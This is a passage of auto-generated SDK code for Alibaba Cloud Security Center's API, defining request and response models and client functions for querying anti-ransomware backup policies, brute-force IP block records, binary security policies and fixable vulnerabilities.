    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 10.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of anti-ransomware policies returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  policies?: [ 
    {
      clientErrorCount?: int32(name='ClientErrorCount', description='The number of the servers on which the anti-ransomware agent is in an abnormal state.', example='2'),
      clientErrorUuidList?: [ string ](name='ClientErrorUuidList', description='The UUIDs of the servers on which the anti-ransomware agent is in an **abnormal** state.'),
      clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **running**: normal
*   **exception**: abnormal', example='running'),
      healthClientCount?: int32(name='HealthClientCount', description='The number of the servers on which the anti-ransomware agent is in a normal state.', example='2'),
      healthClientUuidList?: [ string ](name='HealthClientUuidList', description='The UUIDs of the servers on which the anti-ransomware agent is in a **normal** state.'),
      id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='11'),
      lastStatusSyncTime?: long(name='LastStatusSyncTime', description='The time when the anti-ransomware policy was last updated. Unit: milliseconds.', example='1719488535027'),
      name?: string(name='Name', description='The name of the anti-ransomware policy.', example='SecurityStrategy-20200303'),
      policy?: string(name='Policy', description='The configurations of the anti-ransomware policy. The value of this parameter is in the JSON format and contains the following fields:

*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that are protected. If the value of this field is [], all formats of files are protected.

*   **Source**: the directory that is protected. If the value of this field is [], all directories are protected.

*   **ExcludeSystemPath**: indicates whether a specified directory is excluded from the anti-ransomware policy. If the value of this field is **true**, a directory is excluded. If this field is left empty, no directories are excluded.

*   **Exclude**: the directory that is excluded from the anti-ransomware policy. If the value of this field is [], no directories are excluded.

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If the value of this field is I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If the value of this field is I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If the value of this field is 7, backup data is retained for a week. If the value of this field is 365, backup data is retained for a year. If the value of this field is -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If the value of this field is 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: indicates whether the VSS feature is enabled. The feature is available only for Windows servers. Valid values:

    *   **true**
    *   **false**

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='{"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows\\\\\\\\","Python27\\\\\\\\","Program Files (x86)\\\\\\\\","Program Files\\\\\\\\","Boot\\\\\\\\","$RECYCLE.BIN","System Volume Information\\\\\\\\","Users\\\\\\\\Administrator\\\\\\\\NTUSER.DAT*","ProgramData\\\\\\\\","pagefile.sys","Users\\\\\\\\Default\\\\\\\\NTUSER.DAT*","Users\\\\\\\\Administrator\\\\\\\\ntuser.*"],"ExcludeSystemPath":true,"Include":[],"IsDefault":1,"Retention":7,"Schedule":"I|1630689360|PT24H","Source":[],"SpeedLimiter":"","UseVss":true}'),
      policyRegionId?: string(name='PolicyRegionId', description='The ID of the region that you specified for data backup when you installed the anti-ransomware agent for the server not deployed on Alibaba Cloud.', example='ch-hangzhou'),
      policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   1.0.0
*   2.0.0', example='2.0.0'),
      preStatus?: string(name='PreStatus', description='The previous status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='disabled'),
      remarkedUuidList?: [ string ](name='RemarkedUuidList', description='The UUIDs that are returned based on the value of the MachineRemark request parameter.'),
      serverType?: string(name='ServerType', description='The type of the server. Valid values:

*   **OUT_CLOUD**: server not deployed on Alibaba Cloud
*   **ALIYUN**: Elastic Compute Service (ECS) instance
*   **TRIPARTITE**: simple application server', example='OUT_CLOUD'),
      serviceErrorCount?: int32(name='ServiceErrorCount', description='The number of servers on which data backup is exceptional.', example='2'),
      serviceErrorUuidList?: [ string ](name='ServiceErrorUuidList', description='The UUIDs of the servers on which data backup is exceptional.'),
      status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='enabled'),
      upgradeStatus?: string(name='UpgradeStatus', description='The upgrade status of the anti-ransomware policy. Valid values:

*   **NotUpgraded**
*   **Upgrading**
*   **UpgradeFailed**
*   **UpgradeSuccess**', example='Upgrading'),
      uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.'),
    }
  ](name='Policies', description='The details of the anti-ransomware policy.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackupPoliciesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBackupPoliciesResponseBody(name='body'),
}

/**
 * @summary Queries anti-ransomware policies.
 *
 * @param request DescribeBackupPoliciesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBackupPoliciesResponse
 */
async function describeBackupPoliciesWithOptions(request: DescribeBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries anti-ransomware policies.
 *
 * @param request DescribeBackupPoliciesRequest
 * @return DescribeBackupPoliciesResponse
 */
async function describeBackupPolicies(request: DescribeBackupPoliciesRequest): DescribeBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPoliciesWithOptions(request, runtime);
}

model DescribeBackupPolicyRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='51880'),
}

model DescribeBackupPolicyResponseBody = {
  backupPolicyDetail?: {
    clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **running**: normal
*   **exception**: abnormal', example='running'),
    id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='51880'),
    name?: string(name='Name', description='The name of the anti-ransomware policy.', example='testBuckUp'),
    policy?: string(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to [].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to [].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to [].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='{
      "Exclude": [
            "/bin/",
            "/usr/bin/",
            "/sbin/",
            "/boot/",
            "/proc/",
            "/sys/",
            "/srv/",
            "/lib/",
            "/selinux/",
            "/usr/sbin/",
            "/run/",
            "/lib32/",
            "/lib64/",
            "/lost+found/",
            "/var/lib/kubelet/",
            "/var/lib/ntp/proc",
            "/var/lib/container",
            "Windows\\\\\\\\",
            "Python27\\\\\\\\",
            "Program Files (x86)\\\\\\\\",
            "Program Files\\\\\\\\",
            "Boot\\\\\\\\",
            "$RECYCLE.BIN",
            "System Volume Information\\\\\\\\",
            "Users\\\\\\\\Administrator\\\\\\\\NTUSER.DAT*",
            "ProgramData\\\\\\\\",
            "pagefile.sys",
            "Users\\\\\\\\Default\\\\\\\\NTUSER.DAT*",
            "Users\\\\\\\\Administrator\\\\\\\\ntuser.*"
      ],
      "ExcludeSystemPath": true,
      "Include": [],
      "IsDefault": 1,
      "Retention": 7,
      "Schedule": "I|1630689360|PT24H",
      "Source": [],
      "SpeedLimiter": "",
      "UseVss": true
}'),
    policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy.

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
    regionId?: string(name='RegionId', description='The ID of the region in which backup data is stored.', example='cn-beijing'),
    status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='closed'),
    uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of the servers to which the anti-ransomware policy is applied.'),
  }(name='BackupPolicyDetail', description='The details of the anti-ransomware policy.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeBackupPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBackupPolicyResponseBody(name='body'),
}

/**
 * @summary Queries the details of an anti-ransomware policy for servers.
 *
 * @param request DescribeBackupPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBackupPolicyResponse
 */
async function describeBackupPolicyWithOptions(request: DescribeBackupPolicyRequest, runtime: Util.RuntimeOptions): DescribeBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of an anti-ransomware policy for servers.
 *
 * @param request DescribeBackupPolicyRequest
 * @return DescribeBackupPolicyResponse
 */
async function describeBackupPolicy(request: DescribeBackupPolicyRequest): DescribeBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPolicyWithOptions(request, runtime);
}

model DescribeBackupRestoreCountResponseBody = {
  backupRestoreCount?: {
    recovering?: int32(name='Recovering', description='The number of the restoration tasks that are in the **being restored** state.', example='3'),
    total?: int32(name='Total', description='The total number of the restoration tasks that you create.', example='30'),
  }(name='BackupRestoreCount', description='The statistics of restoration tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeBackupRestoreCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBackupRestoreCountResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of restoration tasks.
 *
 * @description If you have created restoration tasks, you can call this operation to query the number of restoration tasks that are in the **restored** or **being restored** state.
 *
 * @param request DescribeBackupRestoreCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBackupRestoreCountResponse
 */
async function describeBackupRestoreCountWithOptions(runtime: Util.RuntimeOptions): DescribeBackupRestoreCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeBackupRestoreCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of restoration tasks.
 *
 * @description If you have created restoration tasks, you can call this operation to query the number of restoration tasks that are in the **restored** or **being restored** state.
 *
 * @return DescribeBackupRestoreCountResponse
 */
async function describeBackupRestoreCount(): DescribeBackupRestoreCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupRestoreCountWithOptions(runtime);
}

model DescribeBinarySecurityPoliciesRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  name?: string(name='Name', description='The name of the policy.', example='policy-auto-5patxz'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='59.82.XXX.XXX'),
  status?: string(name='Status', description='The status of the policy. Valid values:

*   **enabled**
*   **disabled**', example='enabled'),
}

model DescribeBinarySecurityPoliciesResponseBody = {
  binarySecurityPolicies?: [ 
    {
      clusters?: [ 
        {
          clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c316702acdf5f45e1a9dc7fc52f21****'),
          namespaces?: [ string ](name='Namespaces', description='The namespaces.'),
        }
      ](name='Clusters', description='The information about clusters.'),
      name?: string(name='Name', description='The name of the policy.', example='logtail'),
      policy?: map[string]any(name='Policy', description='The content of the policy. The value is in the JSON format. A key supports the following values:

*   **policyMode**: the type of the policy. Default value: requireAttestor.
*   **requiredAttestors**: the required witnesses.', example='{\\\\"PolicyMode\\\\":\\\\"requireAttestor\\\\",\\\\"RequiredAttestors\\\\":[\\\\"test-xcs-04-11-hhht\\\\"]}'),
      remark?: string(name='Remark', description='The description.', example='test'),
      status?: string(name='Status', description='The status of the policy. Valid values:

*   **enabled**
*   **disabled**', example='enabled'),
    }
  ](name='BinarySecurityPolicies', description='The information about security policies.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on each page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='218'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
}

model DescribeBinarySecurityPoliciesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBinarySecurityPoliciesResponseBody(name='body'),
}

/**
 * @summary Queries binary security policies.
 *
 * @param request DescribeBinarySecurityPoliciesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBinarySecurityPoliciesResponse
 */
async function describeBinarySecurityPoliciesWithOptions(request: DescribeBinarySecurityPoliciesRequest, runtime: Util.RuntimeOptions): DescribeBinarySecurityPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBinarySecurityPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries binary security policies.
 *
 * @param request DescribeBinarySecurityPoliciesRequest
 * @return DescribeBinarySecurityPoliciesResponse
 */
async function describeBinarySecurityPolicies(request: DescribeBinarySecurityPoliciesRequest): DescribeBinarySecurityPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBinarySecurityPoliciesWithOptions(request, runtime);
}

model DescribeBruteForceRecordsRequest {
  blockIp?: string(name='BlockIp', description='The IP address that is blocked.', example='175.106.XX.XX'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1g6wxdwps7s9dz****'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page. We recommend that you do not leave this parameter empty.', example='20'),
  remark?: string(name='Remark', description='The name or IP address of the server to query.', example='1.2.XX.XX'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='1'),
}

model DescribeBruteForceRecordsResponseBody = {
  machineList?: [ 
    {
      aliNetOnline?: boolean(name='AliNetOnline', description='The status of the host network extension. Valid values:

*   **true**: online
*   **false**: offline', example='false'),
      blockExpireDate?: long(name='BlockExpireDate', description='The timestamp when the block action on the IP address becomes invalid.', example='1671506882063'),
      blockIp?: string(name='BlockIp', description='The IP address that is blocked.', example='10.12.XX.XX'),
      blockType?: string(name='BlockType', description='The blocking type. Valid values:

*   **group**: security group
*   **alinet**: host network extension', example='alinet'),
      errorCode?: string(name='ErrorCode', description='The error code returned when the defense rule fails to block the IP address.', example='InstanceSecurityGroupLimitExceeded'),
      id?: long(name='Id', description='The ID of the primary key that is recorded in the defense rule.', example='112XX'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='record-test-***'),
      internetIp?: string(name='InternetIp', description='The public IP address.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='192.168.XX.XX'),
      port?: string(name='Port', description='The port that is attacked.', example='22/22'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='AntiRuleName'),
      source?: string(name='Source', description='The type of the defense rule. Valid values:

*   **userRule**: custom rule
*   **blinkRule**: system rule', example='userRule'),
      status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the defense rule takes effect.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
    }
  ](name='MachineList', description='The IP addresses.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='263'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeBruteForceRecordsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBruteForceRecordsResponseBody(name='body'),
}

/**
 * @summary Queries the IP addresses that are blocked by a defense rule against brute-force attacks.
 *
 * @param request DescribeBruteForceRecordsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBruteForceRecordsResponse
 */
async function describeBruteForceRecordsWithOptions(request: DescribeBruteForceRecordsRequest, runtime: Util.RuntimeOptions): DescribeBruteForceRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the IP addresses that are blocked by a defense rule against brute-force attacks.
 *
 * @param request DescribeBruteForceRecordsRequest
 * @return DescribeBruteForceRecordsResponse
 */
async function describeBruteForceRecords(request: DescribeBruteForceRecordsRequest): DescribeBruteForceRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceRecordsWithOptions(request, runtime);
}

model DescribeBruteForceSummaryRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='203.119.XX.XX'),
}

model DescribeBruteForceSummaryResponseBody = {
  bruteForceSummary?: {
    allStrategyCount?: int32(name='AllStrategyCount', description='The number of anti-brute force IP blocking policies.', example='13'),
    antiBruteForceRuleCount?: string(name='AntiBruteForceRuleCount', description='The number of defense policies.', example='2'),
    customEffectiveCount?: string(name='CustomEffectiveCount', description='The number of custom blocking rules that are in effect.', example='3'),
    customRecordCount?: string(name='CustomRecordCount', description='The number of custom blocking rules.', example='19730'),
    effectiveCount?: int32(name='EffectiveCount', description='The number of anti-brute force IP blocking policies enabled.', example='2'),
    systemEffectiveCount?: string(name='SystemEffectiveCount', description='The number of system blocking rules that are in effect.', example='1'),
    systemRecordCount?: string(name='SystemRecordCount', description='The number of system blocking rules.', example='2'),
  }(name='BruteForceSummary', description='The statistics of IP address blocking policies.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='AE60EAE3-ABD0-897C-B0F16CAC6C7D'),
}

model DescribeBruteForceSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeBruteForceSummaryResponseBody(name='body'),
}

/**
 * @summary The source IP address of the request.
 *
 * @param request DescribeBruteForceSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeBruteForceSummaryResponse
 */
async function describeBruteForceSummaryWithOptions(request: DescribeBruteForceSummaryRequest, runtime: Util.RuntimeOptions): DescribeBruteForceSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary The source IP address of the request.
 *
 * @param request DescribeBruteForceSummaryRequest
 * @return DescribeBruteForceSummaryResponse
 */
async function describeBruteForceSummary(request: DescribeBruteForceSummaryRequest): DescribeBruteForceSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceSummaryWithOptions(request, runtime);
}

model DescribeCanAccessVpcSaleResponseBody = {
  canAccess?: boolean(name='CanAccess', description='Indicates whether the purchase can be made according to VPC.', example='true'),
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for this request, which can be used for troubleshooting and problem localization.', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model DescribeCanAccessVpcSaleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCanAccessVpcSaleResponseBody(name='body'),
}

/**
 * @summary Check if the asset can be sold by VPC
 *
 * @param request DescribeCanAccessVpcSaleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCanAccessVpcSaleResponse
 */
async function describeCanAccessVpcSaleWithOptions(runtime: Util.RuntimeOptions): DescribeCanAccessVpcSaleResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCanAccessVpcSale',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Check if the asset can be sold by VPC
 *
 * @return DescribeCanAccessVpcSaleResponse
 */
async function describeCanAccessVpcSale(): DescribeCanAccessVpcSaleResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCanAccessVpcSaleWithOptions(runtime);
}

model DescribeCanFixVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability that is specified in Common Vulnerabilities and Exposures (CVE).', example='RHSA-2017:0184-Important: mysql security update'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c80f79959fd724a888e1187779b13****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='sas-test-cnnf'),
  containerId?: string(name='ContainerId', description='The container ID.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d5a****'),
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page 1. Default value: 1.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

**y**: The vulnerability is handled. **n**: The vulnerability is not handled.', example='n'),
  digest?: string(name='Digest', description='The unique identifier of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
  image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  instanceId?: string(name='InstanceId', description='The ID of the container image.

>  You can call the [ListRepository](https://help.aliyun.com/document_detail/451339.html) operation of Container Registry and obtain the ID of the container image from **InstanceId** in the response.', example='cri-rv4nvbv8iju4****'),
  name?: string(name='Name', description='The name of the vulnerability.', example='scan:AVD-2022-953356'),
  namespace?: string(name='Namespace', description='The namespace of the cluster.

>  You can call the [GetOpaClusterNamespaceList](~~GetOpaClusterNamespaceList~~) operation to query the namespaces of clusters.', example='default'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20'),
